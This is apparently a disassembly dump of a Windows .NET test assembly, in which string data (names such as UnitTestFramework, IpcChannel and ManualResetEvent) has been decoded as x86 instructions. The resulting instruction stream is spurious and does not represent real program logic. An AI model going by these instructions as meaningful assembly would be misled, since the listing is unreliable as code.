  402e80:	ins    DWORD PTR es:[edi],dx
  402e81:	jae    0x402ee6
  402e83:	outs   dx,DWORD PTR ds:[esi]
  402e84:	jb     0x402ef2
  402e86:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  402e8d:	gs ins DWORD PTR es:[edi],dx
  402e8f:	add    BYTE PTR [ebp+0x61],cl
  402e92:	jb     0x402f07
  402e94:	push   0x79426c61
  402e99:	push   edx
  402e9a:	gs dec di
  402e9d:	bound  ebp,QWORD PTR [edx+0x65]
  402ea0:	arpl   WORD PTR [eax+eax*1+0x4d],si
  402ea4:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402eab:	je     0x402edb
  402ead:	push   esi
  402eae:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402eb5:	jne    0x402f1b
  402eb7:	imul   ebp,DWORD PTR [edi+0x2e],0x6c617551
  402ebe:	imul   esi,DWORD PTR [ecx+edi*2+0x54],0x736c6f6f
  402ec6:	cs inc ebp
  402ec8:	js     0x402f2f
  402eca:	arpl   WORD PTR [ebp+0x74],si
  402ecd:	imul   ebp,DWORD PTR [edi+0x6e],0x6d6d6f43
  402ed4:	outs   dx,DWORD PTR ds:[esi]
  402ed5:	outs   dx,BYTE PTR ds:[esi]
  402ed6:	add    BYTE PTR [ecx+0x54],cl
  402ed9:	gs jae 0x402f50
  402edc:	inc    ecx
  402edd:	outs   dx,BYTE PTR gs:[si]
  402ee0:	je     0x402f32
  402ee2:	jb     0x402f53
  402ee4:	arpl   WORD PTR [ebp+0x73],sp
  402ee7:	jae    0x402ee9
  402ee9:	dec    ecx
  402eea:	inc    ecx
  402eeb:	outs   dx,BYTE PTR gs:[si]
  402eee:	je     0x402f40
  402ef0:	jb     0x402f61
  402ef2:	arpl   WORD PTR [ebp+0x73],sp
  402ef5:	jae    0x402ef7
  402ef7:	dec    ebp
  402ef8:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402eff:	je     0x402f2f
  402f01:	push   esi
  402f02:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402f09:	jne    0x402f6f
  402f0b:	imul   ebp,DWORD PTR [edi+0x2e],0x6c617551
  402f12:	imul   esi,DWORD PTR [ecx+edi*2+0x54],0x736c6f6f
  402f1a:	cs inc ecx
  402f1c:	outs   dx,BYTE PTR gs:[si]
  402f1f:	je     0x402f70
  402f21:	bound  ebp,QWORD PTR [edx+0x65]
  402f24:	arpl   WORD PTR [eax+eax*1+0x41],si
  402f28:	outs   dx,BYTE PTR gs:[si]
  402f2b:	je     0x402f7c
  402f2d:	bound  ebp,QWORD PTR [edx+0x65]
  402f30:	arpl   WORD PTR [eax+eax*1+0x6d],si
  402f34:	pop    edi
  402f35:	popa   
  402f36:	outs   dx,BYTE PTR gs:[si]
  402f39:	je     0x402f8a
  402f3b:	bound  ebp,QWORD PTR [edx+0x65]
  402f3e:	arpl   WORD PTR [eax+eax*1+0x53],si
  402f42:	jns    0x402fb7
  402f44:	je     0x402fab
  402f46:	ins    DWORD PTR es:[edi],dx
  402f47:	cs push edx
  402f49:	jne    0x402fb9
  402f4b:	je     0x402fb6
  402f4d:	ins    DWORD PTR es:[edi],dx
  402f4e:	gs cs push edx
  402f51:	gs ins DWORD PTR es:[edi],dx
  402f53:	outs   dx,DWORD PTR ds:[esi]
  402f54:	je     0x402fbf
  402f56:	outs   dx,BYTE PTR ds:[esi]
  402f57:	add    BYTE PTR [bp+di+0x79],dl
  402f5b:	jae    0x402fd1
  402f5d:	gs ins DWORD PTR es:[edi],dx
  402f5f:	cs push edx
  402f61:	jne    0x402fd1
  402f63:	je     0x402fce
  402f65:	ins    DWORD PTR es:[edi],dx
  402f66:	gs cs push edx
  402f69:	gs ins DWORD PTR es:[edi],dx
  402f6b:	outs   dx,DWORD PTR ds:[esi]
  402f6c:	je     0x402fd7
  402f6e:	outs   dx,BYTE PTR ds:[esi]
  402f6f:	addr16 cs inc ebx
  402f72:	push   0x656e6e61
  402f77:	ins    BYTE PTR es:[edi],dx
  402f78:	jae    0x402fa8
  402f7a:	dec    ecx
  402f7b:	jo     0x402fe0
  402f7d:	add    BYTE PTR [ecx+0x70],cl
  402f80:	arpl   WORD PTR [ebx+0x68],ax
  402f83:	popa   
  402f84:	outs   dx,BYTE PTR ds:[esi]
  402f85:	outs   dx,BYTE PTR ds:[esi]
  402f86:	gs ins BYTE PTR es:[edi],dx
  402f88:	add    BYTE PTR [ebp+0x5f],ch
  402f8b:	arpl   WORD PTR [eax+0x61],bp
  402f8e:	outs   dx,BYTE PTR ds:[esi]
  402f8f:	outs   dx,BYTE PTR ds:[esi]
  402f90:	gs ins BYTE PTR es:[edi],dx
  402f92:	add    BYTE PTR [ebx+0x79],dl
  402f95:	jae    0x40300b
  402f97:	gs ins DWORD PTR es:[edi],dx
  402f99:	cs push esp
  402f9b:	push   0x64616572
  402fa0:	imul   ebp,DWORD PTR [esi+0x67],0x6d695400
  402fa7:	gs jb  0x402faa
  402faa:	ins    DWORD PTR es:[edi],dx
  402fab:	pop    edi
  402fac:	ins    BYTE PTR es:[edi],dx
  402fad:	outs   dx,DWORD PTR ds:[esi]
  402fae:	addr16 push esp
  402fb0:	imul   ebp,DWORD PTR [ebp+0x65],0x5f6d0072
  402fb7:	popa   
  402fb8:	outs   dx,BYTE PTR gs:[si]
  402fbb:	je     0x403008
  402fbd:	gs jns 0x402fc0
  402fc0:	push   ebx
  402fc1:	jns    0x403036
  402fc3:	je     0x40302a
  402fc5:	ins    DWORD PTR es:[edi],dx
  402fc6:	cs inc esp
  402fc8:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  402fcf:	imul   esp,DWORD PTR [ebx+0x73],0x6f725000
  402fd6:	arpl   WORD PTR [ebp+0x73],sp
  402fd9:	jae    0x402fdb
  402fdb:	ins    DWORD PTR es:[edi],dx
  402fdc:	pop    edi
  402fdd:	push   0x5074736f
  402fe2:	jb     0x403053
  402fe4:	arpl   WORD PTR [ebp+0x73],sp
  402fe7:	jae    0x402fe9
  402fe9:	ins    DWORD PTR es:[edi],dx
  402fea:	pop    edi
  402feb:	push   0x4974736f
  402ff0:	jo     0x403055
  402ff2:	push   eax
  402ff3:	outs   dx,DWORD PTR ds:[esi]
  402ff4:	jb     0x40306a
  402ff6:	dec    esi
  402ff7:	popa   
  402ff8:	ins    DWORD PTR es:[edi],dx
  402ff9:	add    BYTE PTR gs:[ebp+0x61],cl
  402ffd:	outs   dx,BYTE PTR ds:[esi]
  402ffe:	jne    0x403061
  403000:	ins    BYTE PTR es:[edi],dx
  403001:	push   edx
  403002:	gs jae 0x40306a
  403005:	je     0x40304c
  403007:	jbe    0x40306e
  403009:	outs   dx,BYTE PTR ds:[esi]
  40300a:	je     0x40300c
  40300c:	ins    DWORD PTR es:[edi],dx
  40300d:	pop    edi
  40300e:	jae    0x403078
  403010:	jne    0x403086
  403012:	outs   dx,DWORD PTR fs:[esi]
  403014:	ja     0x403084
  403016:	inc    ebp
  403017:	jbe    0x40307e
  403019:	outs   dx,BYTE PTR ds:[esi]
  40301a:	je     0x40301c
  40301c:	arpl   WORD PTR cs:[edi+ebp*2+0x72],si
  403021:	add    BYTE PTR [ecx+0x6e],cl
  403024:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40302c:	dec    esp
  40302d:	imul   esp,DWORD PTR [esi+0x65],0x656d6974
  403034:	push   ebx
  403035:	gs jb  0x4030ae
  403038:	imul   esp,DWORD PTR [ebx+0x65],0x69614d00
  40303f:	outs   dx,BYTE PTR ds:[esi]
  403040:	add    BYTE PTR [ecx+0x6e],cl
  403043:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40304b:	add    BYTE PTR [ebp+0x6e],dl
  40304e:	push   0x6c646e61
  403053:	gs fs inc ebp
  403056:	js     0x4030bb
  403058:	gs jo  0x4030cf
  40305b:	imul   ebp,DWORD PTR [edi+0x6e],0x6e657645
  403062:	je     0x4030a5
  403064:	jb     0x4030cd
  403066:	jae    0x403068
  403068:	inc    ebx
  403069:	jne    0x4030dd
  40306b:	jb     0x4030d2
  40306d:	outs   dx,BYTE PTR ds:[esi]
  40306e:	je     0x4030b4
  403070:	outs   dx,DWORD PTR ds:[esi]
  403071:	ins    DWORD PTR es:[edi],dx
  403072:	popa   
  403073:	imul   ebp,DWORD PTR [esi+0x5f],0x61686e55
  40307a:	outs   dx,BYTE PTR ds:[esi]
  40307b:	fs ins BYTE PTR es:[edi],dx
  40307d:	gs fs inc ebp
  403080:	js     0x4030e5
  403082:	gs jo  0x4030f9
  403085:	imul   ebp,DWORD PTR [edi+0x6e],0x6e755200
  40308c:	add    BYTE PTR [ecx+0x54],cl
  40308f:	gs jae 0x403106
  403092:	inc    ecx
  403093:	outs   dx,BYTE PTR gs:[si]
  403096:	je     0x4030e8
  403098:	jb     0x403109
  40309a:	arpl   WORD PTR [ebp+0x73],sp
  40309d:	jae    0x4030ef
  40309f:	jb     0x403110
  4030a1:	js     0x40311c
  4030a3:	add    BYTE PTR [edi+0x65],al
  4030a6:	je     0x4030e9
  4030a8:	outs   dx,BYTE PTR gs:[si]
  4030ab:	je     0x4030fd
  4030ad:	jb     0x40311e
  4030af:	arpl   WORD PTR [ebp+0x73],sp
  4030b2:	jae    0x403104
  4030b4:	jb     0x403125
  4030b6:	js     0x403131
  4030b8:	add    BYTE PTR [ebx+0x72],al
  4030bb:	gs popa 
  4030bd:	je     0x403124
  4030bf:	inc    ebx
  4030c0:	push   0x656e6e61
  4030c5:	ins    BYTE PTR es:[edi],dx
  4030c6:	add    BYTE PTR [ebx+0x6c],al
  4030c9:	outs   dx,DWORD PTR ds:[esi]
  4030ca:	jae    0x403131
  4030cc:	inc    ebx
  4030cd:	push   0x656e6e61
  4030d2:	ins    BYTE PTR es:[edi],dx
  4030d3:	add    BYTE PTR [ebx+0x68],al
  4030d6:	arpl   WORD PTR gs:[ebx+0x4c],bp
  4030da:	outs   dx,DWORD PTR ds:[esi]
  4030db:	addr16 push ebx
  4030dd:	imul   edi,DWORD PTR [edx+0x65],0x65764500
  4030e4:	outs   dx,BYTE PTR ds:[esi]
  4030e5:	je     0x403128
  4030e7:	jb     0x403150
  4030e9:	jae    0x4030eb
  4030eb:	push   eax
  4030ec:	popa   
  4030ed:	jb     0x403154
  4030ef:	outs   dx,BYTE PTR ds:[esi]
  4030f0:	je     0x403142
  4030f2:	jb     0x403163
  4030f4:	arpl   WORD PTR [ebp+0x73],sp
  4030f7:	jae    0x40313e
  4030f9:	js     0x403164
  4030fb:	je     0x403162
  4030fd:	add    BYTE PTR fs:[ecx+0x41],cl
  403101:	outs   dx,BYTE PTR gs:[si]
  403104:	je     0x403155
  403106:	bound  ebp,QWORD PTR [edx+0x65]
  403109:	arpl   WORD PTR [eax+eax*1+0x4d],si
  40310d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403114:	je     0x403144
  403116:	push   esi
  403117:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40311e:	jne    0x403184
  403120:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  403127:	push   esp
  403128:	outs   dx,DWORD PTR ds:[esi]
  403129:	outs   dx,DWORD PTR ds:[esi]
  40312a:	ins    BYTE PTR es:[edi],dx
  40312b:	jae    0x40315b
  40312d:	inc    ecx
  40312e:	outs   dx,BYTE PTR gs:[si]
  403131:	je     0x403161
  403133:	dec    ecx
  403134:	push   esp
  403135:	gs jae 0x4031ac
  403138:	inc    ecx
  403139:	outs   dx,BYTE PTR gs:[si]
  40313c:	je     0x40318e
  40313e:	jb     0x4031af
  403140:	arpl   WORD PTR [ebp+0x73],sp
  403143:	jae    0x403173
  403145:	inc    edi
  403146:	gs je  0x40319d
  403149:	gs jae 0x4031c0
  40314c:	inc    ecx
  40314d:	outs   dx,BYTE PTR gs:[si]
  403150:	je     0x4031a1
  403152:	bound  ebp,QWORD PTR [edx+0x65]
  403155:	arpl   WORD PTR [eax+eax*1+0x47],si
  403159:	gs je  0x4031b0
  40315c:	gs jae 0x4031d3
  40315f:	inc    ecx
  403160:	outs   dx,BYTE PTR gs:[si]
  403163:	je     0x4031b4
  403165:	bound  ebp,QWORD PTR [edx+0x65]
  403168:	arpl   WORD PTR [eax+eax*1+0x4d],si
  40316c:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403173:	je     0x4031a3
  403175:	push   esi
  403176:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40317d:	jne    0x4031e3
  40317f:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  403186:	push   esp
  403187:	outs   dx,DWORD PTR ds:[esi]
  403188:	outs   dx,DWORD PTR ds:[esi]
  403189:	ins    BYTE PTR es:[edi],dx
  40318a:	jae    0x4031ba
  40318c:	inc    ecx
  40318d:	outs   dx,BYTE PTR gs:[si]
  403190:	je     0x4031c0
  403192:	dec    ecx
  403193:	inc    ecx
  403194:	outs   dx,BYTE PTR gs:[si]
  403197:	je     0x4031e9
  403199:	jb     0x40320a
  40319b:	arpl   WORD PTR [ebp+0x73],sp
  40319e:	jae    0x4031ce
  4031a0:	push   ebx
  4031a1:	push   0x6f647475
  4031a6:	ja     0x403216
  4031a8:	add    BYTE PTR [ebx+0x68],dl
  4031ab:	jne    0x403221
  4031ad:	outs   dx,DWORD PTR fs:[esi]
  4031af:	ja     0x40321f
  4031b1:	add    BYTE PTR [ecx+0x67],ah
  4031b4:	outs   dx,BYTE PTR gs:[esi]
  4031b6:	je     0x403203
  4031b8:	gs jns 0x4031bb
  4031bb:	push   0x5074736f
  4031c0:	jb     0x403231
  4031c2:	arpl   WORD PTR [ebp+0x73],sp
  4031c5:	jae    0x403210
  4031c7:	add    BYTE PTR fs:[eax+0x6f],ch
  4031cb:	jae    0x403241
  4031cd:	dec    ecx
  4031ce:	jo     0x403233
  4031d0:	push   eax
  4031d1:	outs   dx,DWORD PTR ds:[esi]
  4031d2:	jb     0x403248
  4031d4:	dec    esi
  4031d5:	popa   
  4031d6:	ins    DWORD PTR es:[edi],dx
  4031d7:	add    BYTE PTR gs:[ecx+0x72],ah
  4031db:	addr16 jae 0x4031de
  4031de:	jae    0x403245
  4031e0:	outs   dx,BYTE PTR ds:[esi]
  4031e1:	fs gs jb 0x4031e5
  4031e5:	add    BYTE PTR gs:[edi+0x0],ch
  4031e9:	push   ebx
  4031ea:	jns    0x40325f
  4031ec:	je     0x403253
  4031ee:	ins    DWORD PTR es:[edi],dx
  4031ef:	cs push edx
  4031f1:	jne    0x403261
  4031f3:	je     0x40325e
  4031f5:	ins    DWORD PTR es:[edi],dx
  4031f6:	gs cs push esi
  4031f9:	gs jb  0x40326f
  4031fc:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  403203:	push   esp
  403204:	popa   
  403205:	jb     0x40326e
  403207:	gs je  0x403250
  40320a:	jb     0x40326d
  40320c:	ins    DWORD PTR es:[edi],dx
  40320d:	gs ja  0x40327f
  403210:	jb     0x40327d
  403212:	inc    ecx
  403213:	je     0x403289
  403215:	jb     0x403280
  403217:	bound  esi,QWORD PTR [ebp+0x74]
  40321a:	add    BYTE PTR gs:[ebx+0x79],dl
  40321e:	jae    0x403294
  403220:	gs ins DWORD PTR es:[edi],dx
  403222:	cs push edx
  403224:	jne    0x403294
  403226:	je     0x403291
  403228:	ins    DWORD PTR es:[edi],dx
  403229:	gs cs dec ecx
  40322c:	outs   dx,BYTE PTR ds:[esi]
  40322d:	je     0x403294
  40322f:	jb     0x4032a0
  403231:	jo     0x403286
  403233:	gs jb  0x4032ac
  403236:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  40323d:	ins    DWORD PTR es:[edi],dx
  40323e:	push   esi
  40323f:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  403246:	je     0x4032bc
  403248:	jb     0x4032b3
  40324a:	bound  esi,QWORD PTR [ebp+0x74]
  40324d:	add    BYTE PTR gs:[ebx+0x4c],al
  403251:	push   ebx
  403252:	inc    ebx
  403253:	outs   dx,DWORD PTR ds:[esi]
  403254:	ins    DWORD PTR es:[edi],dx
  403255:	jo     0x4032c3
  403257:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  40325e:	jb     0x4032c9
  403260:	bound  esi,QWORD PTR [ebp+0x74]
  403263:	add    BYTE PTR gs:[ebx+0x79],dl
  403267:	jae    0x4032dd
  403269:	gs ins DWORD PTR es:[edi],dx
  40326b:	cs push edx
  40326d:	gs data16 ins BYTE PTR es:[edi],dx
  403270:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403275:	outs   dx,BYTE PTR ds:[esi]
  403276:	add    BYTE PTR [ecx+0x73],al
  403279:	jae    0x4032e0
  40327b:	ins    DWORD PTR es:[edi],dx
  40327c:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  403280:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  403288:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40328f:	jae    0x403304
  403291:	gs ins DWORD PTR es:[edi],dx
  403293:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  403297:	gs jae 0x4032fd
  40329a:	jb     0x403305
  40329c:	jo     0x403312
  40329e:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4032a5:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4032ac:	jae    0x403321
  4032ae:	gs ins DWORD PTR es:[edi],dx
  4032b0:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4032b4:	gs popaw 
  4032b7:	jne    0x403325
  4032b9:	je     0x4032fc
  4032bb:	ins    BYTE PTR es:[edi],dx
  4032bc:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  4032c3:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4032ca:	jae    0x40333f
  4032cc:	gs ins DWORD PTR es:[edi],dx
  4032ce:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  4032d2:	outs   dx,DWORD PTR ds:[esi]
  4032d3:	ins    DWORD PTR es:[edi],dx
  4032d4:	jo     0x403337
  4032d6:	outs   dx,BYTE PTR ds:[esi]
  4032d7:	jns    0x40331a
  4032d9:	je     0x40334f
  4032db:	jb     0x403346
  4032dd:	bound  esi,QWORD PTR [ebp+0x74]
  4032e0:	add    BYTE PTR gs:[ecx+0x73],al
  4032e4:	jae    0x40334b
  4032e6:	ins    DWORD PTR es:[edi],dx
  4032e7:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  4032eb:	jb     0x40335c
  4032ed:	fs jne 0x403353
  4032f0:	je     0x403333
  4032f2:	je     0x403368
  4032f4:	jb     0x40335f
  4032f6:	bound  esi,QWORD PTR [ebp+0x74]
  4032f9:	add    BYTE PTR gs:[ecx+0x73],al
  4032fd:	jae    0x403364
  4032ff:	ins    DWORD PTR es:[edi],dx
  403300:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403304:	outs   dx,DWORD PTR ds:[esi]
  403305:	jo     0x403380
  403307:	jb     0x403372
  403309:	addr16 push 0x74744174
  40330f:	jb     0x40337a
  403311:	bound  esi,QWORD PTR [ebp+0x74]
  403314:	add    BYTE PTR gs:[ecx+0x73],al
  403318:	jae    0x40337f
  40331a:	ins    DWORD PTR es:[edi],dx
  40331b:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  40331f:	gs jb  0x403395
  403322:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403329:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403330:	jae    0x4033a5
  403332:	gs ins DWORD PTR es:[edi],dx
  403334:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  403338:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  403340:	outs   dx,DWORD PTR ds:[esi]
  403341:	outs   dx,BYTE PTR ds:[esi]
  403342:	inc    ecx
  403343:	je     0x4033b9
  403345:	jb     0x4033b0
  403347:	bound  esi,QWORD PTR [ebp+0x74]
  40334a:	add    BYTE PTR gs:[ecx+0x73],al
  40334e:	jae    0x4033b5
  403350:	ins    DWORD PTR es:[edi],dx
  403351:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  403355:	outs   dx,BYTE PTR ds:[esi]
  403356:	outs   dx,WORD PTR ds:[esi]
  403358:	jb     0x4033c7
  40335a:	popa   
  40335b:	je     0x4033c6
  40335d:	outs   dx,DWORD PTR ds:[esi]
  40335e:	outs   dx,BYTE PTR ds:[esi]
  40335f:	popa   
  403360:	ins    BYTE PTR es:[edi],dx
  403361:	push   esi
  403362:	gs jb  0x4033d8
  403365:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40336c:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  403373:	jns    0x4033e8
  403375:	je     0x4033dc
  403377:	ins    DWORD PTR es:[edi],dx
  403378:	cs push edx
  40337a:	gs jae 0x4033ec
  40337d:	jne    0x4033f1
  40337f:	arpl   WORD PTR [ebp+0x73],sp
  403382:	add    BYTE PTR [ebx+0x61],dl
  403385:	je     0x4033ec
  403387:	ins    BYTE PTR es:[edi],dx
  403388:	ins    BYTE PTR es:[edi],dx
  403389:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  403391:	popa   
  403392:	arpl   WORD PTR [esi+edx*2+0x65],si
  403396:	jb     0x40340b
  403398:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40339f:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  4033a6:	gs jne 0x40341d
  4033a9:	jb     0x40340c
  4033ab:	ins    BYTE PTR es:[edi],dx
  4033ac:	push   edx
  4033ad:	gs jae 0x40341f
  4033b0:	jne    0x403424
  4033b2:	arpl   WORD PTR [ebp+0x73],sp
  4033b5:	dec    esp
  4033b6:	popa   
  4033b7:	outs   dx,BYTE PTR ds:[esi]
  4033b8:	addr16 jne 0x40341c
  4033bb:	addr16 gs inc ecx
  4033be:	je     0x403434
  4033c0:	jb     0x40342b
  4033c2:	bound  esi,QWORD PTR [ebp+0x74]
  4033c5:	add    BYTE PTR gs:[ecx+0x73],al
  4033c9:	jae    0x403430
  4033cb:	ins    DWORD PTR es:[edi],dx
  4033cc:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4033d0:	gs ins BYTE PTR es:[edi],dx
  4033d2:	popa   
  4033d3:	jns    0x403428
  4033d5:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  4033dc:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4033e3:	jae    0x403458
  4033e5:	gs ins DWORD PTR es:[edi],dx
  4033e7:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  4033eb:	gs jns 0x403434
  4033ee:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4033f6:	bound  esi,QWORD PTR [ebp+0x74]
  4033f9:	add    BYTE PTR gs:[ecx+0x73],al
  4033fd:	jae    0x403464
  4033ff:	ins    DWORD PTR es:[edi],dx
  403400:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  403404:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  40340b:	gs dec ebx
  40340d:	gs jns 0x403451
  403410:	je     0x403486
  403412:	jb     0x40347d
  403414:	bound  esi,QWORD PTR [ebp+0x74]
  403417:	add    BYTE PTR gs:[ebx+0x79],dl
  40341b:	jae    0x403491
  40341d:	gs ins DWORD PTR es:[edi],dx
  40341f:	cs push edx
  403421:	jne    0x403491
  403423:	je     0x40348e
  403425:	ins    DWORD PTR es:[edi],dx
  403426:	gs cs inc ebx
  403429:	outs   dx,DWORD PTR ds:[esi]
  40342a:	ins    DWORD PTR es:[edi],dx
  40342b:	jo     0x403496
  40342d:	ins    BYTE PTR es:[edi],dx
  40342e:	gs jb  0x403484
  403431:	gs jb  0x4034aa
  403434:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  40343b:	outs   dx,BYTE PTR ds:[esi]
  40343c:	je     0x4034a7
  40343e:	ins    DWORD PTR es:[edi],dx
  40343f:	gs inc ebx
  403441:	outs   dx,DWORD PTR ds:[esi]
  403442:	ins    DWORD PTR es:[edi],dx
  403443:	jo     0x4034a6
  403445:	je     0x4034b0
  403447:	bound  ebp,QWORD PTR [ecx+0x6c]
  40344a:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  403452:	bound  esi,QWORD PTR [ebp+0x74]
  403455:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40345a:	jne    0x4034c3
  40345c:	addr16 popa 
  40345e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  403462:	je     0x4034d8
  403464:	jb     0x4034cf
  403466:	bound  esi,QWORD PTR [ebp+0x74]
  403469:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40346e:	jne    0x4034d7
  403470:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  403478:	jae    0x40347a
  40347a:	inc    ebx
  40347b:	outs   dx,DWORD PTR ds:[esi]
  40347c:	ins    DWORD PTR es:[edi],dx
  40347d:	jo     0x4034e8
  40347f:	ins    BYTE PTR es:[edi],dx
  403480:	popa   
  403481:	je     0x4034ec
  403483:	outs   dx,DWORD PTR ds:[esi]
  403484:	outs   dx,BYTE PTR ds:[esi]
  403485:	push   edx
  403486:	gs ins BYTE PTR es:[edi],dx
  403488:	popa   
  403489:	js     0x4034ec
  40348b:	je     0x4034f6
  40348d:	outs   dx,DWORD PTR ds:[esi]
  40348e:	outs   dx,BYTE PTR ds:[esi]
  40348f:	jae    0x4034d2
  403491:	je     0x403507
  403493:	jb     0x4034fe
  403495:	bound  esi,QWORD PTR [ebp+0x74]
  403498:	add    BYTE PTR gs:[ecx+0x54],dl
  40349c:	inc    ecx
  40349d:	outs   dx,BYTE PTR gs:[si]
  4034a0:	je     0x4034d5
  4034a2:	xor    al,BYTE PTR [eax]
  4034a4:	dec    esp
  4034a5:	outs   dx,DWORD PTR ds:[esi]
  4034a6:	popa   
  4034a7:	fs gs jb 0x4034fa
  4034ab:	jo     0x403521
  4034ad:	imul   ebp,DWORD PTR [ebp+0x69],0x6974617a
  4034b4:	outs   dx,DWORD PTR ds:[esi]
  4034b5:	outs   dx,BYTE PTR ds:[esi]
  4034b6:	inc    ecx
  4034b7:	je     0x40352d
  4034b9:	jb     0x403524
  4034bb:	bound  esi,QWORD PTR [ebp+0x74]
  4034be:	add    BYTE PTR gs:[edi+ebp*2+0x61],cl
  4034c3:	fs gs jb 0x403516
  4034c7:	jo     0x40353d
  4034c9:	imul   ebp,DWORD PTR [ebp+0x69],0x6974617a
  4034d0:	outs   dx,DWORD PTR ds:[esi]
  4034d1:	outs   dx,BYTE PTR ds:[esi]
  4034d2:	add    BYTE PTR [ebp+0x69],cl
  4034d5:	arpl   WORD PTR [edx+0x6f],si
  4034d8:	jae    0x403549
  4034da:	data16 je 0x40350b
  4034dd:	dec    ecx
  4034de:	outs   dx,BYTE PTR ds:[esi]
  4034df:	je     0x403546
  4034e1:	jb     0x403551
  4034e3:	popa   
  4034e4:	ins    BYTE PTR es:[edi],dx
  4034e5:	cs push eax
  4034e7:	gs jb  0x403550
  4034ea:	outs   dx,DWORD PTR ds:[esi]
  4034eb:	jb     0x40355a
  4034ed:	popa   
  4034ee:	outs   dx,BYTE PTR ds:[esi]
  4034ef:	arpl   WORD PTR [ebp+0x0],sp
  4034f2:	inc    ebx
  4034f3:	outs   dx,DWORD PTR ds:[esi]
  4034f4:	fs gs dec ebp
  4034f7:	popa   
  4034f8:	jb     0x403565
  4034fa:	gs jb  0x403570
  4034fd:	add    BYTE PTR [ecx+0x6e],cl
  403500:	jae    0x403576
  403502:	popa   
  403503:	outs   dx,BYTE PTR ds:[esi]
  403504:	arpl   WORD PTR [ebp+0x0],sp
  403507:	dec    ecx
  403508:	outs   dx,BYTE PTR ds:[esi]
  403509:	imul   esi,DWORD PTR [eax+edx*2+0x65],0x726f6672
  403511:	ins    DWORD PTR es:[edi],dx
  403512:	popa   
  403513:	outs   dx,BYTE PTR ds:[esi]
  403514:	arpl   WORD PTR [ebp+0x44],sp
  403517:	ins    BYTE PTR es:[edi],dx
  403518:	ins    BYTE PTR es:[edi],dx
  403519:	add    BYTE PTR [ebx+0x6f],al
  40351c:	fs gs dec ebp
  40351f:	popa   
  403520:	jb     0x40358d
  403522:	gs jb  0x403525
  403525:	inc    ecx
  403526:	jo     0x403598
  403528:	inc    esp
  403529:	outs   dx,DWORD PTR ds:[esi]
  40352a:	ins    DWORD PTR es:[edi],dx
  40352b:	popa   
  40352c:	imul   ebp,DWORD PTR [esi+0x0],0x5f746567
  403533:	inc    ebx
  403534:	jne    0x4035a8
  403536:	jb     0x40359d
  403538:	outs   dx,BYTE PTR ds:[esi]
  403539:	je     0x40357f
  40353b:	outs   dx,DWORD PTR ds:[esi]
  40353c:	ins    DWORD PTR es:[edi],dx
  40353d:	popa   
  40353e:	imul   ebp,DWORD PTR [esi+0x0],0x61686e55
  403545:	outs   dx,BYTE PTR ds:[esi]
  403546:	fs ins BYTE PTR es:[edi],dx
  403548:	gs fs inc ebp
  40354b:	js     0x4035b0
  40354d:	gs jo  0x4035c4
  403550:	imul   ebp,DWORD PTR [edi+0x6e],0x6e657645
  403557:	je     0x4035a1
  403559:	popa   
  40355a:	outs   dx,BYTE PTR ds:[esi]
  40355b:	fs ins BYTE PTR es:[edi],dx
  40355d:	gs jb  0x403560
  403560:	popa   
  403561:	fs fs pop edi
  403564:	push   ebp
  403565:	outs   dx,BYTE PTR ds:[esi]
  403566:	push   0x6c646e61
  40356b:	gs fs inc ebp
  40356e:	js     0x4035d3
  403570:	gs jo  0x4035e7
  403573:	imul   ebp,DWORD PTR [edi+0x6e],0x73734100
  40357a:	gs ins DWORD PTR es:[edi],dx
